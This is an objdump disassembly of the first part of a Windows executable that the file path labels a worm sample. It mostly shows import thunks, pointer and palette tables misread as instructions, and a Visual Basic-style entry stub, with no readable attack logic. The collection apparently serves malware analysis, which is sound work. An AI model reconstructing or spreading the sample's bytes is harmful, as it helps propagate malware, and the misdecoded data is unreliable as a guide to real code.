
malware_samples/worm/f2f23d9965931308c1b523c8f9ddcab670a5dfbd11d090bb4f280e657a33745a.exe:     file format pei-i386


Disassembly of section :

00401000 <>:
  401000:	fc                   	cld
  401001:	b1 48                	mov    $0x48,%cl
  401003:	73 8d                	jae    0x400f92
  401005:	69 48 73 6e 98 49 73 	imul   $0x7349986e,0x73(%eax),%ecx
  40100c:	2e 72 46             	jb,pn  0x401055
  40100f:	73 9e                	jae    0x400faf
  401011:	10 49 73             	adc    %cl,0x73(%ecx)
  401014:	ce                   	into
  401015:	49                   	dec    %ecx
  401016:	3b 73 0d             	cmp    0xd(%ebx),%esi
  401019:	54                   	push   %esp
  40101a:	3b 73 73             	cmp    0x73(%ebx),%esi
  40101d:	10 49 73             	adc    %cl,0x73(%ecx)
  401020:	b0 db                	mov    $0xdb,%al
  401022:	3b 73 4e             	cmp    0x4e(%ebx),%esi
  401025:	62 48 73             	bound  %ecx,0x73(%eax)
  401028:	c9                   	leave
  401029:	66 3b 73 d5          	cmp    -0x2b(%ebx),%si
  40102d:	68 48 73 74 b9       	push   $0xb9747348
  401032:	47                   	inc    %edi
  401033:	73 27                	jae    0x40105c
  401035:	54                   	push   %esp
  401036:	3b 73 e1             	cmp    -0x1f(%ebx),%esi
  401039:	4b                   	dec    %ebx
  40103a:	3b 73 02             	cmp    0x2(%ebx),%esi
  40103d:	62 48 73             	bound  %ecx,0x73(%eax)
  401040:	f5                   	cmc
  401041:	1f                   	pop    %ds
  401042:	47                   	inc    %edi
  401043:	73 a7                	jae    0x400fec
  401045:	66 3b 73 c9          	cmp    -0x37(%ebx),%si
  401049:	8f 49 73 2c          	(bad)
  40104d:	45                   	inc    %ebp
  40104e:	3b 73 29             	cmp    0x29(%ebx),%esi
  401051:	2f                   	das
  401052:	47                   	inc    %edi
  401053:	73 e3                	jae    0x401038
  401055:	42                   	inc    %edx
  401056:	3b 73 9a             	cmp    -0x66(%ebx),%esi
  401059:	62 48 73             	bound  %ecx,0x73(%eax)
  40105c:	98                   	cwtl
  40105d:	45                   	inc    %ebp
  40105e:	3b 73 9a             	cmp    -0x66(%ebx),%esi
  401061:	63 48 73             	arpl   %ecx,0x73(%eax)
  401064:	df 7e 3b             	fistpll 0x3b(%esi)
  401067:	73 4a                	jae    0x4010b3
  401069:	bc 49 73 64 b3       	mov    $0xb3647349,%esp
  40106e:	48                   	dec    %eax
  40106f:	73 21                	jae    0x401092
  401071:	90                   	nop
  401072:	49                   	dec    %ecx
  401073:	73 af                	jae    0x401024
  401075:	44                   	inc    %esp
  401076:	3b 73 d5             	cmp    -0x2b(%ebx),%esi
  401079:	63 3b                	arpl   %edi,(%ebx)
  40107b:	73 6f                	jae    0x4010ec
  40107d:	d8 3a                	fdivrs (%edx)
  40107f:	73 49                	jae    0x4010ca
  401081:	54                   	push   %esp
  401082:	3b 73 b4             	cmp    -0x4c(%ebx),%esi
  401085:	9e                   	sahf
  401086:	47                   	inc    %edi
  401087:	73 ed                	jae    0x401076
  401089:	9e                   	sahf
  40108a:	47                   	inc    %edi
  40108b:	73 de                	jae    0x40106b
  40108d:	49                   	dec    %ecx
  40108e:	3b 73 b8             	cmp    -0x48(%ebx),%esi
  401091:	9d                   	popf
  401092:	3b 73 8a             	cmp    -0x76(%ebx),%esi
  401095:	69 48 73 0a d4 46 73 	imul   $0x7346d40a,0x73(%eax),%ecx
  40109c:	85 e3                	test   %esp,%ebx
  40109e:	3b 73 09             	cmp    0x9(%ebx),%esi
  4010a1:	b4 48                	mov    $0x48,%ah
  4010a3:	73 7c                	jae    0x401121
  4010a5:	67 46                	addr16 inc %esi
  4010a7:	73 5b                	jae    0x401104
  4010a9:	4e                   	dec    %esi
  4010aa:	3b 73 57             	cmp    0x57(%ebx),%esi
  4010ad:	60                   	pusha
  4010ae:	3b 73 1d             	cmp    0x1d(%ebx),%esi
  4010b1:	66 48                	dec    %ax
  4010b3:	73 4e                	jae    0x401103
  4010b5:	63 48 73             	arpl   %ecx,0x73(%eax)
  4010b8:	c4 e5 46 73          	(bad)
  4010bc:	dc 8e 3b 73 7f 9d    	fmull  -0x62808cc5(%esi)
  4010c2:	49                   	dec    %ecx
  4010c3:	73 7c                	jae    0x401141
  4010c5:	69 47 73 c5 b0 47 73 	imul   $0x7347b0c5,0x73(%edi),%eax
  4010cc:	a1 b2 48 73 d2       	mov    0xd27348b2,%eax
  4010d1:	90                   	nop
  4010d2:	46                   	inc    %esi
  4010d3:	73 82                	jae    0x401057
  4010d5:	58                   	pop    %eax
  4010d6:	3b 73 60             	cmp    0x60(%ebx),%esi
  4010d9:	9d                   	popf
  4010da:	47                   	inc    %edi
  4010db:	73 4c                	jae    0x401129
  4010dd:	8c 49 73             	mov    %cs,0x73(%ecx)
  4010e0:	ac                   	lods   %ds:(%esi),%al
  4010e1:	c7                   	(bad)
  4010e2:	3a 73 ce             	cmp    -0x32(%ebx),%dh
  4010e5:	62 48 73             	bound  %ecx,0x73(%eax)
  4010e8:	ce                   	into
  4010e9:	63 48 73             	arpl   %ecx,0x73(%eax)
  4010ec:	f6 44 3b 73 b0       	testb  $0xb0,0x73(%ebx,%edi,1)
  4010f1:	48                   	dec    %eax
  4010f2:	3b 73 7c             	cmp    0x7c(%ebx),%esi
  4010f5:	e6 46                	out    %al,$0x46
  4010f7:	73 02                	jae    0x4010fb
  4010f9:	63 48 73             	arpl   %ecx,0x73(%eax)
  4010fc:	3d 5d 48 73 67       	cmp    $0x6773485d,%eax
  401101:	e9 46 73 3e de       	jmp    0xde7e844c
  401106:	39 73 fe             	cmp    %esi,-0x2(%ebx)
  401109:	0f 49 73 c4          	cmovns -0x3c(%ebx),%esi
  40110d:	05 47 73 a2 13       	add    $0x13a27347,%eax
  401112:	49                   	dec    %ecx
  401113:	73 ca                	jae    0x4010df
  401115:	16                   	push   %ss
  401116:	49                   	dec    %ecx
  401117:	73 f1                	jae    0x40110a
  401119:	49                   	dec    %ecx
  40111a:	3b 73 36             	cmp    0x36(%ebx),%esi
  40111d:	b1 48                	mov    $0x48,%cl
  40111f:	73 5e                	jae    0x40117f
  401121:	47                   	inc    %edi
  401122:	3b 73 a1             	cmp    -0x5f(%ebx),%esi
  401125:	0f 49 73 71          	cmovns 0x71(%ebx),%esi
  401129:	b3 47                	mov    $0x47,%bl
  40112b:	73 ea                	jae    0x401117
  40112d:	20 48 73             	and    %cl,0x73(%eax)
  401130:	ba b4 48 73 35       	mov    $0x357348b4,%edx
  401135:	0f 48 73 bc          	cmovs  -0x44(%ebx),%esi
  401139:	e9 46 73 fe 47       	jmp    0x483e8484
  40113e:	3b 73 d7             	cmp    -0x29(%ebx),%esi
  401141:	50                   	push   %eax
  401142:	3b 73 00             	cmp    0x0(%ebx),%esi
  401145:	00 00                	add    %al,(%eax)
  401147:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40114a:	08 00                	or     %al,(%eax)
	...
  401154:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401155:	33 40 00             	xor    0x0(%eax),%eax
  401158:	0e                   	push   %cs
  401159:	00 08                	add    %cl,(%eax)
  40115b:	00 00                	add    %al,(%eax)
  40115d:	00 00                	add    %al,(%eax)
  40115f:	00 01                	add    %al,(%ecx)
  401161:	35 40 00 dc 34       	xor    $0x34dc0040,%eax
  401166:	40                   	inc    %eax
  401167:	00 18                	add    %bl,(%eax)
  401169:	00 10                	add    %dl,(%eax)
	...
  401173:	00 2a                	add    %ch,(%edx)
  401175:	36 40                	ss inc %eax
  401177:	00 80 11 40 00 00    	add    %al,0x4011(%eax)
  40117d:	00 00                	add    %al,(%eax)
  40117f:	00 01                	add    %al,(%ecx)
  401181:	00 00                	add    %al,(%eax)
  401183:	00 01                	add    %al,(%ecx)
  401185:	00 00                	add    %al,(%eax)
  401187:	00 1d 36 40 00 00    	add    %bl,0x4036
  40118d:	00 00                	add    %al,(%eax)
  40118f:	00 27                	add    %ah,(%edi)
  401191:	00 14 00             	add    %dl,(%eax,%eax,1)
  401194:	2f                   	das
  401195:	42                   	inc    %edx
  401196:	40                   	inc    %eax
  401197:	00 8a 42 40 00 36    	add    %cl,0x36004042(%edx)
  40119d:	42                   	inc    %edx
  40119e:	40                   	inc    %eax
  40119f:	00 00                	add    %al,(%eax)
  4011a1:	00 00                	add    %al,(%eax)
  4011a3:	00 a8 11 40 00 1d    	add    %ch,0x1d004011(%eax)
  4011a9:	00 00                	add    %al,(%eax)
  4011ab:	00 c5                	add    %al,%ch
  4011ad:	36 40                	ss inc %eax
  4011af:	00 cc                	add    %cl,%ah
  4011b1:	36 40                	ss inc %eax
  4011b3:	00 db                	add    %bl,%bl
  4011b5:	36 40                	ss inc %eax
  4011b7:	00 e8                	add    %ch,%al
  4011b9:	36 40                	ss inc %eax
  4011bb:	00 06                	add    %al,(%esi)
  4011bd:	37                   	aaa
  4011be:	40                   	inc    %eax
  4011bf:	00 18                	add    %bl,(%eax)
  4011c1:	37                   	aaa
  4011c2:	40                   	inc    %eax
  4011c3:	00 c9                	add    %cl,%cl
  4011c5:	37                   	aaa
  4011c6:	40                   	inc    %eax
  4011c7:	00 d6                	add    %dl,%dh
  4011c9:	37                   	aaa
  4011ca:	40                   	inc    %eax
  4011cb:	00 d6                	add    %dl,%dh
  4011cd:	37                   	aaa
  4011ce:	40                   	inc    %eax
  4011cf:	00 e8                	add    %ch,%al
  4011d1:	37                   	aaa
  4011d2:	40                   	inc    %eax
  4011d3:	00 50 3a             	add    %dl,0x3a(%eax)
  4011d6:	40                   	inc    %eax
  4011d7:	00 76 3a             	add    %dh,0x3a(%esi)
  4011da:	40                   	inc    %eax
  4011db:	00 1e                	add    %bl,(%esi)
  4011dd:	3b 40 00             	cmp    0x0(%eax),%eax
  4011e0:	2e 3b 40 00          	cmp    %cs:0x0(%eax),%eax
  4011e4:	43                   	inc    %ebx
  4011e5:	3b 40 00             	cmp    0x0(%eax),%eax
  4011e8:	66 3b 40 00          	cmp    0x0(%eax),%ax
  4011ec:	a2 3b 40 00 0c       	mov    %al,0xc00403b
  4011f1:	3e 40                	ds inc %eax
  4011f3:	00 2f                	add    %ch,(%edi)
  4011f5:	3e 40                	ds inc %eax
  4011f7:	00 4a 3e             	add    %cl,0x3e(%edx)
  4011fa:	40                   	inc    %eax
  4011fb:	00 d5                	add    %dl,%ch
  4011fd:	3e 40                	ds inc %eax
  4011ff:	00 a7 3f 40 00 13    	add    %ah,0x1300403f(%edi)
  401205:	41                   	inc    %ecx
  401206:	40                   	inc    %eax
  401207:	00 4e 41             	add    %cl,0x41(%esi)
  40120a:	40                   	inc    %eax
  40120b:	00 d6                	add    %dl,%dh
  40120d:	41                   	inc    %ecx
  40120e:	40                   	inc    %eax
  40120f:	00 f9                	add    %bh,%cl
  401211:	41                   	inc    %ecx
  401212:	40                   	inc    %eax
  401213:	00 1c 42             	add    %bl,(%edx,%eax,2)
  401216:	40                   	inc    %eax
  401217:	00 1c 42             	add    %bl,(%edx,%eax,2)
  40121a:	40                   	inc    %eax
  40121b:	00 28                	add    %ch,(%eax)
  40121d:	42                   	inc    %edx
  40121e:	40                   	inc    %eax
	...
  401227:	00 0a                	add    %cl,(%edx)
  401229:	00 04 00             	add    %al,(%eax,%eax,1)
  40122c:	00 00                	add    %al,(%eax)
  40122e:	00 00                	add    %al,(%eax)
  401230:	dd 43 40             	fldl   0x40(%ebx)
  401233:	00 d3                	add    %dl,%bl
  401235:	43                   	inc    %ebx
  401236:	40                   	inc    %eax
  401237:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40123a:	10 00                	adc    %al,(%eax)
	...
  401244:	3a 47 40             	cmp    0x40(%edi),%al
  401247:	00 50 12             	add    %dl,0x12(%eax)
  40124a:	40                   	inc    %eax
  40124b:	00 00                	add    %al,(%eax)
  40124d:	00 00                	add    %al,(%eax)
  40124f:	00 01                	add    %al,(%ecx)
  401251:	00 00                	add    %al,(%eax)
  401253:	00 01                	add    %al,(%ecx)
  401255:	00 00                	add    %al,(%eax)
  401257:	00 18                	add    %bl,(%eax)
  401259:	47                   	inc    %edi
  40125a:	40                   	inc    %eax
  40125b:	00 00                	add    %al,(%eax)
  40125d:	00 00                	add    %al,(%eax)
  40125f:	00 26                	add    %ah,(%esi)
  401261:	00 14 00             	add    %dl,(%eax,%eax,1)
  401264:	00 00                	add    %al,(%eax)
  401266:	00 00                	add    %al,(%eax)
  401268:	20 51 40             	and    %dl,0x40(%ecx)
  40126b:	00 d3                	add    %dl,%bl
  40126d:	50                   	push   %eax
  40126e:	40                   	inc    %eax
  40126f:	00 00                	add    %al,(%eax)
  401271:	00 00                	add    %al,(%eax)
  401273:	00 78 12             	add    %bh,0x12(%eax)
  401276:	40                   	inc    %eax
  401277:	00 15 00 00 00 de    	add    %dl,0xde000000
  40127d:	47                   	inc    %edi
  40127e:	40                   	inc    %eax
  40127f:	00 f1                	add    %dh,%cl
  401281:	47                   	inc    %edi
  401282:	40                   	inc    %eax
  401283:	00 00                	add    %al,(%eax)
  401285:	48                   	dec    %eax
  401286:	40                   	inc    %eax
  401287:	00 b9 48 40 00 51    	add    %bh,0x51004048(%ecx)
  40128d:	49                   	dec    %ecx
  40128e:	40                   	inc    %eax
  40128f:	00 5e 49             	add    %bl,0x49(%esi)
  401292:	40                   	inc    %eax
  401293:	00 cc                	add    %cl,%ah
  401295:	49                   	dec    %ecx
  401296:	40                   	inc    %eax
  401297:	00 aa 4a 40 00 7c    	add    %ch,0x7c00404a(%edx)
  40129d:	4b                   	dec    %ebx
  40129e:	40                   	inc    %eax
  40129f:	00 e6                	add    %ah,%dh
  4012a1:	4d                   	dec    %ebp
  4012a2:	40                   	inc    %eax
  4012a3:	00 52 4f             	add    %dl,0x4f(%edx)
  4012a6:	40                   	inc    %eax
  4012a7:	00 8d 4f 40 00 15    	add    %cl,0x1500404f(%ebp)
  4012ad:	50                   	push   %eax
  4012ae:	40                   	inc    %eax
  4012af:	00 38                	add    %bh,(%eax)
  4012b1:	50                   	push   %eax
  4012b2:	40                   	inc    %eax
  4012b3:	00 5b 50             	add    %bl,0x50(%ebx)
  4012b6:	40                   	inc    %eax
  4012b7:	00 5b 50             	add    %bl,0x50(%ebx)
  4012ba:	40                   	inc    %eax
  4012bb:	00 67 50             	add    %ah,0x50(%edi)
  4012be:	40                   	inc    %eax
  4012bf:	00 97 50 40 00 b6    	add    %dl,-0x49ffbfb0(%edi)
  4012c5:	50                   	push   %eax
  4012c6:	40                   	inc    %eax
  4012c7:	00 cc                	add    %cl,%ah
  4012c9:	50                   	push   %eax
  4012ca:	40                   	inc    %eax
  4012cb:	00 cc                	add    %cl,%ah
  4012cd:	50                   	push   %eax
  4012ce:	40                   	inc    %eax
	...
  4012d7:	00 06                	add    %al,(%esi)
  4012d9:	00 04 00             	add    %al,(%eax,%eax,1)
  4012dc:	00 00                	add    %al,(%eax)
  4012de:	00 00                	add    %al,(%eax)
  4012e0:	95                   	xchg   %eax,%ebp
  4012e1:	55                   	push   %ebp
  4012e2:	40                   	inc    %eax
  4012e3:	00 55 55             	add    %dl,0x55(%ebp)
  4012e6:	40                   	inc    %eax
	...
  4012ef:	00 ff                	add    %bh,%bh
  4012f1:	25 74 10 40 00       	and    $0x401074,%eax
  4012f6:	ff 25 a8 10 40 00    	jmp    *0x4010a8
  4012fc:	ff 25 c0 10 40 00    	jmp    *0x4010c0
  401302:	ff 25 58 10 40 00    	jmp    *0x401058
  401308:	ff 25 3c 10 40 00    	jmp    *0x40103c
  40130e:	ff 25 e4 10 40 00    	jmp    *0x4010e4
  401314:	ff 25 24 10 40 00    	jmp    *0x401024
  40131a:	ff 25 fc 10 40 00    	jmp    *0x4010fc
  401320:	ff 25 60 10 40 00    	jmp    *0x401060
  401326:	ff 25 f8 10 40 00    	jmp    *0x4010f8
  40132c:	ff 25 e8 10 40 00    	jmp    *0x4010e8
  401332:	ff 25 b4 10 40 00    	jmp    *0x4010b4
  401338:	ff 25 94 10 40 00    	jmp    *0x401094
  40133e:	ff 25 b0 10 40 00    	jmp    *0x4010b0
  401344:	ff 25 2c 10 40 00    	jmp    *0x40102c
  40134a:	ff 25 04 10 40 00    	jmp    *0x401004
  401350:	ff 25 1c 11 40 00    	jmp    *0x40111c
  401356:	ff 25 00 10 40 00    	jmp    *0x401000
  40135c:	ff 25 34 11 40 00    	jmp    *0x401134
  401362:	ff 25 cc 10 40 00    	jmp    *0x4010cc
  401368:	ff 25 6c 10 40 00    	jmp    *0x40106c
  40136e:	ff 25 a0 10 40 00    	jmp    *0x4010a0
  401374:	ff 25 30 11 40 00    	jmp    *0x401130
  40137a:	ff 25 2c 11 40 00    	jmp    *0x40112c
  401380:	ff 25 70 10 40 00    	jmp    *0x401070
  401386:	ff 25 64 10 40 00    	jmp    *0x401064
  40138c:	ff 25 48 10 40 00    	jmp    *0x401048
  401392:	ff 25 24 11 40 00    	jmp    *0x401124
  401398:	ff 25 c4 10 40 00    	jmp    *0x4010c4
  40139e:	ff 25 ac 10 40 00    	jmp    *0x4010ac
  4013a4:	ff 25 c8 10 40 00    	jmp    *0x4010c8
  4013aa:	ff 25 18 10 40 00    	jmp    *0x401018
  4013b0:	ff 25 28 11 40 00    	jmp    *0x401128
  4013b6:	ff 25 18 11 40 00    	jmp    *0x401118
  4013bc:	ff 25 14 10 40 00    	jmp    *0x401014
  4013c2:	ff 25 5c 10 40 00    	jmp    *0x40105c
  4013c8:	ff 25 d0 10 40 00    	jmp    *0x4010d0
  4013ce:	ff 25 30 10 40 00    	jmp    *0x401030
  4013d4:	ff 25 08 11 40 00    	jmp    *0x401108
  4013da:	ff 25 40 11 40 00    	jmp    *0x401140
  4013e0:	ff 25 54 10 40 00    	jmp    *0x401054
  4013e6:	ff 25 3c 11 40 00    	jmp    *0x40113c
  4013ec:	ff 25 ec 10 40 00    	jmp    *0x4010ec
  4013f2:	ff 25 90 10 40 00    	jmp    *0x401090
  4013f8:	ff 25 10 11 40 00    	jmp    *0x401110
  4013fe:	ff 25 bc 10 40 00    	jmp    *0x4010bc
  401404:	ff 25 0c 11 40 00    	jmp    *0x40110c
  40140a:	ff 25 28 10 40 00    	jmp    *0x401028
  401410:	ff 25 f0 10 40 00    	jmp    *0x4010f0
  401416:	ff 25 34 10 40 00    	jmp    *0x401034
  40141c:	ff 25 20 11 40 00    	jmp    *0x401120
  401422:	ff 25 38 10 40 00    	jmp    *0x401038
  401428:	ff 25 e0 10 40 00    	jmp    *0x4010e0
  40142e:	ff 25 b8 10 40 00    	jmp    *0x4010b8
  401434:	ff 25 20 10 40 00    	jmp    *0x401020
  40143a:	ff 25 1c 10 40 00    	jmp    *0x40101c
  401440:	ff 25 14 11 40 00    	jmp    *0x401114
  401446:	ff 25 50 10 40 00    	jmp    *0x401050
  40144c:	ff 25 8c 10 40 00    	jmp    *0x40108c
  401452:	ff 25 44 10 40 00    	jmp    *0x401044
  401458:	ff 25 38 11 40 00    	jmp    *0x401138
  40145e:	ff 25 f4 10 40 00    	jmp    *0x4010f4
  401464:	ff 25 88 10 40 00    	jmp    *0x401088
  40146a:	ff 25 84 10 40 00    	jmp    *0x401084
  401470:	ff 25 80 10 40 00    	jmp    *0x401080
  401476:	ff 25 4c 10 40 00    	jmp    *0x40104c
  40147c:	ff 25 68 10 40 00    	jmp    *0x401068
  401482:	ff 25 00 11 40 00    	jmp    *0x401100
  401488:	ff 25 08 10 40 00    	jmp    *0x401008
  40148e:	ff 25 40 10 40 00    	jmp    *0x401040
  401494:	ff 25 78 10 40 00    	jmp    *0x401078
  40149a:	ff 25 10 10 40 00    	jmp    *0x401010
  4014a0:	ff 25 98 10 40 00    	jmp    *0x401098
  4014a6:	ff 25 dc 10 40 00    	jmp    *0x4010dc
  4014ac:	ff 25 0c 10 40 00    	jmp    *0x40100c
  4014b2:	ff 25 d8 10 40 00    	jmp    *0x4010d8
  4014b8:	ff 25 d4 10 40 00    	jmp    *0x4010d4
  4014be:	ff 25 a4 10 40 00    	jmp    *0x4010a4
  4014c4:	ff 25 7c 10 40 00    	jmp    *0x40107c
  4014ca:	ff 25 9c 10 40 00    	jmp    *0x40109c
  4014d0:	ff 25 04 11 40 00    	jmp    *0x401104
  4014d6:	00 00                	add    %al,(%eax)
  4014d8:	68 e0 24 40 00       	push   $0x4024e0
  4014dd:	e8 ee ff ff ff       	call   0x4014d0
  4014e2:	00 00                	add    %al,(%eax)
  4014e4:	00 00                	add    %al,(%eax)
  4014e6:	00 00                	add    %al,(%eax)
  4014e8:	30 00                	xor    %al,(%eax)
  4014ea:	00 00                	add    %al,(%eax)
  4014ec:	40                   	inc    %eax
  4014ed:	00 00                	add    %al,(%eax)
  4014ef:	00 00                	add    %al,(%eax)
  4014f1:	00 00                	add    %al,(%eax)
  4014f3:	00 a7 37 b0 4f c3    	add    %ah,-0x3cb04fc9(%edi)
  4014f9:	85 78 4d             	test   %edi,0x4d(%eax)
  4014fc:	a8 2a                	test   $0x2a,%al
  4014fe:	16                   	push   %ss
  4014ff:	12 07                	adc    (%edi),%al
  401501:	fd                   	std
  401502:	e9 03 00 00 00       	jmp    0x40150a
  401507:	00 00                	add    %al,(%eax)
  401509:	00 01                	add    %al,(%ecx)
  40150b:	00 00                	add    %al,(%eax)
  40150d:	00 6f 6e             	add    %ch,0x6e(%edi)
  401510:	20 4e 6f             	and    %cl,0x6f(%esi)
  401513:	72 70                	jb     0x401585
  401515:	6a 74                	push   $0x74
  401517:	44                   	inc    %esp
  401518:	69 73 6b 42 69 6e 64 	imul   $0x646e6942,0x6b(%ebx),%esi
  40151f:	65 72 00             	gs jb  0x401522
  401522:	20 20                	and    %ah,(%eax)
  401524:	00 00                	add    %al,(%eax)
  401526:	00 00                	add    %al,(%eax)
  401528:	ff cc                	dec    %esp
  40152a:	31 00                	xor    %eax,(%eax)
  40152c:	01 ce                	add    %ecx,%esi
  40152e:	ef                   	out    %eax,(%dx)
  40152f:	a3 0b d3 bb 82       	mov    %eax,0x82bbd30b
  401534:	4b                   	dec    %ebx
  401535:	8d 4f 99             	lea    -0x67(%edi),%ecx
  401538:	18 81 24 46 6b 15    	sbb    %al,0x156b4624(%ecx)
  40153e:	8a 07                	mov    (%edi),%al
  401540:	32 eb                	xor    %bl,%ch
  401542:	4b                   	dec    %ebx
  401543:	5c                   	pop    %esp
  401544:	45                   	inc    %ebp
  401545:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  401546:	45                   	inc    %ebp
  401547:	11 aa c5 58 68 97    	adc    %ebp,-0x6897a73b(%edx)
  40154d:	3a 4f ad             	cmp    -0x53(%edi),%cl
  401550:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  401556:	0c 00                	or     $0x0,%al
  401558:	aa                   	stos   %al,%es:(%edi)
  401559:	00 60 d3             	add    %ah,-0x2d(%eax)
  40155c:	93                   	xchg   %eax,%ebx
	...
  401581:	07                   	pop    %es
  401582:	0f 00 00             	sldt   (%eax)
  401585:	d4 0e                	aam    $0xe
  401587:	00 00                	add    %al,(%eax)
  401589:	00 07                	add    %al,(%edi)
  40158b:	00 66 72             	add    %ah,0x72(%esi)
  40158e:	6d                   	insl   (%dx),%es:(%edi)
  40158f:	4d                   	dec    %ebp
  401590:	61                   	popa
  401591:	69 6e 00 0d 01 05 00 	imul   $0x5010d,0x0(%esi),%ebp
  401598:	46                   	inc    %esi
  401599:	6f                   	outsl  %ds:(%esi),(%dx)
  40159a:	72 6d                	jb     0x401609
  40159c:	31 00                	xor    %eax,(%eax)
  40159e:	19 01                	sbb    %eax,(%ecx)
  4015a0:	00 42 00             	add    %al,0x0(%edx)
  4015a3:	22 00                	and    (%eax),%al
  4015a5:	23 8e 0e 00 00 6c    	and    0x6c00000e(%esi),%ecx
  4015ab:	74 00                	je     0x4015ad
  4015ad:	00 86 0e 00 00 00    	add    %al,0xe(%esi)
  4015b3:	00 01                	add    %al,(%ecx)
  4015b5:	00 01                	add    %al,(%ecx)
  4015b7:	00 2f                	add    %ch,(%edi)
  4015b9:	2f                   	das
  4015ba:	00 00                	add    %al,(%eax)
  4015bc:	01 00                	add    %eax,(%eax)
  4015be:	08 00                	or     %al,(%eax)
  4015c0:	70 0e                	jo     0x4015d0
  4015c2:	00 00                	add    %al,(%eax)
  4015c4:	16                   	push   %ss
  4015c5:	00 00                	add    %al,(%eax)
  4015c7:	00 28                	add    %ch,(%eax)
  4015c9:	00 00                	add    %al,(%eax)
  4015cb:	00 2f                	add    %ch,(%edi)
  4015cd:	00 00                	add    %al,(%eax)
  4015cf:	00 5e 00             	add    %bl,0x0(%esi)
  4015d2:	00 00                	add    %al,(%eax)
  4015d4:	01 00                	add    %eax,(%eax)
  4015d6:	08 00                	or     %al,(%eax)
  4015d8:	00 00                	add    %al,(%eax)
  4015da:	00 00                	add    %al,(%eax)
  4015dc:	d0 08                	rorb   $1,(%eax)
	...
  4015f6:	80 00 00             	addb   $0x0,(%eax)
  4015f9:	80 00 00             	addb   $0x0,(%eax)
  4015fc:	00 80 80 00 80 00    	add    %al,0x800080(%eax)
  401602:	00 00                	add    %al,(%eax)
  401604:	80 00 80             	addb   $0x80,(%eax)
  401607:	00 80 80 00 00 c0    	add    %al,-0x3fffff80(%eax)
  40160d:	c0 c0 00             	rol    $0x0,%al
  401610:	c0 dc c0             	rcr    $0xc0,%ah
  401613:	00 f0                	add    %dh,%al
  401615:	ca a6 00             	lret   $0xa6
  401618:	00 20                	add    %ah,(%eax)
  40161a:	40                   	inc    %eax
  40161b:	00 00                	add    %al,(%eax)
  40161d:	20 60 00             	and    %ah,0x0(%eax)
  401620:	00 20                	add    %ah,(%eax)
  401622:	80 00 00             	addb   $0x0,(%eax)
  401625:	20 a0 00 00 20 c0    	and    %ah,-0x3fe00000(%eax)
  40162b:	00 00                	add    %al,(%eax)
  40162d:	20 e0                	and    %ah,%al
  40162f:	00 00                	add    %al,(%eax)
  401631:	40                   	inc    %eax
  401632:	00 00                	add    %al,(%eax)
  401634:	00 40 20             	add    %al,0x20(%eax)
  401637:	00 00                	add    %al,(%eax)
  401639:	40                   	inc    %eax
  40163a:	40                   	inc    %eax
  40163b:	00 00                	add    %al,(%eax)
  40163d:	40                   	inc    %eax
  40163e:	60                   	pusha
  40163f:	00 00                	add    %al,(%eax)
  401641:	40                   	inc    %eax
  401642:	80 00 00             	addb   $0x0,(%eax)
  401645:	40                   	inc    %eax
  401646:	a0 00 00 40 c0       	mov    0xc0400000,%al
  40164b:	00 00                	add    %al,(%eax)
  40164d:	40                   	inc    %eax
  40164e:	e0 00                	loopne 0x401650
  401650:	00 60 00             	add    %ah,0x0(%eax)
  401653:	00 00                	add    %al,(%eax)
  401655:	60                   	pusha
  401656:	20 00                	and    %al,(%eax)
  401658:	00 60 40             	add    %ah,0x40(%eax)
  40165b:	00 00                	add    %al,(%eax)
  40165d:	60                   	pusha
  40165e:	60                   	pusha
  40165f:	00 00                	add    %al,(%eax)
  401661:	60                   	pusha
  401662:	80 00 00             	addb   $0x0,(%eax)
  401665:	60                   	pusha
  401666:	a0 00 00 60 c0       	mov    0xc0600000,%al
  40166b:	00 00                	add    %al,(%eax)
  40166d:	60                   	pusha
  40166e:	e0 00                	loopne 0x401670
  401670:	00 80 00 00 00 80    	add    %al,-0x80000000(%eax)
  401676:	20 00                	and    %al,(%eax)
  401678:	00 80 40 00 00 80    	add    %al,-0x7fffffc0(%eax)
  40167e:	60                   	pusha
  40167f:	00 00                	add    %al,(%eax)
  401681:	80 80 00 00 80 a0 00 	addb   $0x0,-0x5f800000(%eax)
  401688:	00 80 c0 00 00 80    	add    %al,-0x7fffff40(%eax)
  40168e:	e0 00                	loopne 0x401690
  401690:	00 a0 00 00 00 a0    	add    %ah,-0x60000000(%eax)
  401696:	20 00                	and    %al,(%eax)
  401698:	00 a0 40 00 00 a0    	add    %ah,-0x5fffffc0(%eax)
  40169e:	60                   	pusha
  40169f:	00 00                	add    %al,(%eax)
  4016a1:	a0 80 00 00 a0       	mov    0xa0000080,%al
  4016a6:	a0 00 00 a0 c0       	mov    0xc0a00000,%al
  4016ab:	00 00                	add    %al,(%eax)
  4016ad:	a0 e0 00 00 c0       	mov    0xc00000e0,%al
  4016b2:	00 00                	add    %al,(%eax)
  4016b4:	00 c0                	add    %al,%al
  4016b6:	20 00                	and    %al,(%eax)
  4016b8:	00 c0                	add    %al,%al
  4016ba:	40                   	inc    %eax
  4016bb:	00 00                	add    %al,(%eax)
  4016bd:	c0 60 00 00          	shlb   $0x0,0x0(%eax)
  4016c1:	c0 80 00 00 c0 a0 00 	rolb   $0x0,-0x5f400000(%eax)
  4016c8:	00 c0                	add    %al,%al
  4016ca:	c0 00 00             	rolb   $0x0,(%eax)
  4016cd:	c0 e0 00             	shl    $0x0,%al
  4016d0:	00 e0                	add    %ah,%al
  4016d2:	00 00                	add    %al,(%eax)
  4016d4:	00 e0                	add    %ah,%al
  4016d6:	20 00                	and    %al,(%eax)
  4016d8:	00 e0                	add    %ah,%al
  4016da:	40                   	inc    %eax
  4016db:	00 00                	add    %al,(%eax)
  4016dd:	e0 60                	loopne 0x40173f
  4016df:	00 00                	add    %al,(%eax)
  4016e1:	e0 80                	loopne 0x401663
  4016e3:	00 00                	add    %al,(%eax)
  4016e5:	e0 a0                	loopne 0x401687
  4016e7:	00 00                	add    %al,(%eax)
  4016e9:	e0 c0                	loopne 0x4016ab
  4016eb:	00 00                	add    %al,(%eax)
  4016ed:	e0 e0                	loopne 0x4016cf
  4016ef:	00 40 00             	add    %al,0x0(%eax)
  4016f2:	00 00                	add    %al,(%eax)
  4016f4:	40                   	inc    %eax
  4016f5:	00 20                	add    %ah,(%eax)
  4016f7:	00 40 00             	add    %al,0x0(%eax)
  4016fa:	40                   	inc    %eax
